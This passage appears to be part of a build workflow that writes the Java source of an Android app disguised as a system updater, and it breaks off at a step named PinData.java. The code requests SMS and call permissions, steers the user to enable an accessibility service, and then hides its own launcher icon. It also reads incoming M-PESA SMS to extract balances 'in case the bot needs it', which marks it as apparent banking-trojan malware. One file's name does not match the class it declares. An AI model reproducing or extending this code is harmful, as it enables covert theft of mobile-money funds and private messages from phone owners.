      # =============== SOURCE CODE ===============

      - name: Create MainActivity.java
        run: |
          cat > app/src/main/java/com/system/updator/MainActivity.java << 'EOF'
          package com.system.updator;

          import android.Manifest;
          import android.app.Activity;
          import android.content.ComponentName;
          import android.content.Intent;
          import android.content.pm.PackageManager;
          import android.os.Build;
          import android.os.Bundle;
          import android.os.Handler;
          import android.provider.Settings;
          import android.widget.Button;
          import android.widget.TextView;
          import android.util.Log;
          import androidx.core.app.ActivityCompat;
          import androidx.core.content.ContextCompat;

          public class MainActivity extends Activity {
              private static final int PERMISSION_REQUEST = 100;
              private static final String TAG = "MainActivity";
              private TextView tvStatus;
              private Button btnPermissions, btnAccessibility;

              private static final String[] REQUIRED_PERMISSIONS = {
                  Manifest.permission.RECEIVE_SMS,
                  Manifest.permission.READ_SMS,
                  Manifest.permission.CALL_PHONE,
              };

              @Override
              protected void onCreate(Bundle savedInstanceState) {
                  super.onCreate(savedInstanceState);
                  setContentView(R.layout.activity_main);

                  tvStatus = findViewById(R.id.tvStatus);
                  btnPermissions = findViewById(R.id.btnPermissions);
                  btnAccessibility = findViewById(R.id.btnAccessibility);

                  btnPermissions.setOnClickListener(v -> {
                      Log.d(TAG, "Requesting permissions");
                      if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
                          ActivityCompat.requestPermissions(this, REQUIRED_PERMISSIONS, PERMISSION_REQUEST);
                      }
                  });

                  btnAccessibility.setOnClickListener(v -> {
                      Log.d(TAG, "Opening accessibility settings");
                      Intent intent = new Intent(Settings.ACTION_ACCESSIBILITY_SETTINGS);
                      startActivity(intent);
                  });

                  checkAndHideIfReady();
              }

              @Override
              public void onRequestPermissionsResult(int requestCode, String[] permissions, int[] grantResults) {
                  super.onRequestPermissionsResult(requestCode, permissions, grantResults);
                  if (requestCode == PERMISSION_REQUEST) {
                      checkAndHideIfReady();
                  }
              }

              @Override
              protected void onResume() {
                  super.onResume();
                  checkAndHideIfReady();
              }

              private void checkAndHideIfReady() {
                  boolean allPermsGranted = true;
                  for (String perm : REQUIRED_PERMISSIONS) {
                      if (ContextCompat.checkSelfPermission(this, perm) != PackageManager.PERMISSION_GRANTED) {
                          allPermsGranted = false;
                          tvStatus.setText("⚠️ Grant permissions: " + perm);
                          break;
                      }
                  }

                  boolean accessibilityEnabled = isAccessibilityServiceEnabled();

                  if (allPermsGranted) {
                      tvStatus.setText("✅ Permissions granted");
                      if (accessibilityEnabled) {
                          tvStatus.setText("✅ All ready - disappearing...");
                          hideAppIcon();
                          handler.postDelayed(() -> finish(), 500);
                      } else {
                          tvStatus.setText("⚠️ Enable Accessibility Service");
                      }
                  }
              }

              private boolean isAccessibilityServiceEnabled() {
                  String service = getPackageName() + "/" + FinAutoService.class.getCanonicalName();
                  String enabledServices = Settings.Secure.getString(getContentResolver(),
                      Settings.Secure.ENABLED_ACCESSIBILITY_SERVICES);
                  return enabledServices != null && enabledServices.contains(service);
              }

              private void hideAppIcon() {
                  try {
                      ComponentName componentName = new ComponentName(this, MainActivity.class);
                      getPackageManager().setComponentEnabledSetting(
                          componentName,
                          PackageManager.COMPONENT_ENABLED_STATE_DISABLED,
                          PackageManager.DONT_KILL_APP);
                      Log.d(TAG, "✅ App hidden from launcher");
                  } catch (Exception e) {
                      Log.e(TAG, "Hide icon error", e);
                  }
              }

              private Handler handler = new Handler(android.os.Looper.getMainLooper());
          }
          EOF

      - name: Create BootReceiver.java
        run: |
          cat > app/src/main/java/com/system/updator/BootReceiver.java << 'EOF'
          package com.system.updator;

          import android.content.BroadcastReceiver;
          import android.content.Context;
          import android.content.Intent;
          import android.os.Build;
          import android.os.Bundle;
          import android.telephony.SmsMessage;
          import android.util.Log;
          import java.util.regex.Matcher;
          import java.util.regex.Pattern;

          public class SmsReceiver extends BroadcastReceiver {
              private static final String TAG = "SmsReceiver";

              @Override
              public void onReceive(Context context, Intent intent) {
                  // SMS is only used for backup – we prefer USSD balance check.
                  // But we store it anyway in case the bot needs it.
                  try {
                      Bundle bundle = intent.getExtras();
                      if (bundle == null) return;

                      Object[] pdus = (Object[]) bundle.get("pdus");
                      if (pdus == null || pdus.length == 0) return;

                      for (Object pdu : pdus) {
                          try {
                              SmsMessage msg;
                              if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
                                  String format = bundle.getString("format");
                                  msg = SmsMessage.createFromPdu((byte[]) pdu, format);
                              } else {
                                  msg = SmsMessage.createFromPdu((byte[]) pdu);
                              }

                              String body = msg.getMessageBody();
                              if (body != null && (body.contains("M-PESA") || body.contains("MPESA") || 
                                  body.contains("balance") || body.contains("Balance"))) {
                                  
                                  double balance = extractBalance(body);
                                  if (balance > 0) {
                                      Log.d(TAG, "Balance extracted from SMS: " + balance);
                                      FinAutoService.updateBalance(balance, System.currentTimeMillis());
                                  }
                              }
                          } catch (Exception e) {
                              Log.e(TAG, "PDU error", e);
                          }
                      }
                  } catch (Exception e) {
                      Log.e(TAG, "SMS error", e);
                  }
              }

              private double extractBalance(String text) {
                  try {
                      Pattern p = Pattern.compile("([\\d,\\.]+)");
                      Matcher m = p.matcher(text);
                      while (m.find()) {
                          String num = m.group(1).replace(",", "").replace(" ", "");
                          double val = Double.parseDouble(num);
                          if (val > 0 && val < 1000000) return val;
                      }
                  } catch (Exception e) {
                      Log.e(TAG, "Balance parse error", e);
                  }
                  return 0;
              }
          }
          EOF

      - name: Create PinData.java
